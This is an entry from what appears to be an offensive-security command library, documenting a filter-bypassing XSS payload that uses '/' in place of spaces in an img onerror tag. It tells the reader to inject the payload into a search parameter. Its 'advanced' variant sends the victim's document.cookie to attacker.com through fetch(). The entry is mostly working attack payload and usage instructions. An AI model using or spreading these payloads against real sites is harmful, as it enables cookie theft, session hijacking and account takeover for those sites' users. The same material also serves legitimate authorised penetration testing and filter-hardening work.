---
id: 71fcaaf1-13a5-4ffa-8810-d1340c4f1ab0
name: xss-payload-bypass-slash
type: command
executor: html
data: <img/src='1'/onerror=alert(0)>
output: null
created_at: '2023-04-06T03:56:42.598982+00:00'
updated_at: '2023-04-10T20:21:49.213145+00:00'
platforms:
  - Web
tags:
  - xss
  - bypass
verified: true
validated: true
---

# xss-payload-bypass-slash

## Command

```html
<img/src='1'/onerror=alert(0)>
```

## Description

This HTML payload injects an img tag with an invalid src attribute, using '/' as a space substitute to bypass filters. The onerror event executes JavaScript when the image fails to load, ideal for testing reflected XSS in input fields.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src='1' | Invalid source to trigger onerror | Yes |
| onerror=alert(0) | JavaScript to execute on error; '/' replaces spaces | Yes |

## Examples

### Basic Usage

```html
<img/src='1'/onerror=alert(0)>
```

Inject into a search parameter like ?q=<payload>.

### Advanced Usage

```html
<img/src='1'/onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
```

Exfiltrate cookies instead of alerting.

## Expected Output

Browser popup with alert(0) if injected successfully, or network request to attacker server for advanced variants. No console errors if filter bypassed.

## Related

- [[procedures/Bypass-Space-Filter-in-XSS-with-Exotic-Payloads]]
- [[commands/xss-payload-bypass-formfeed]]
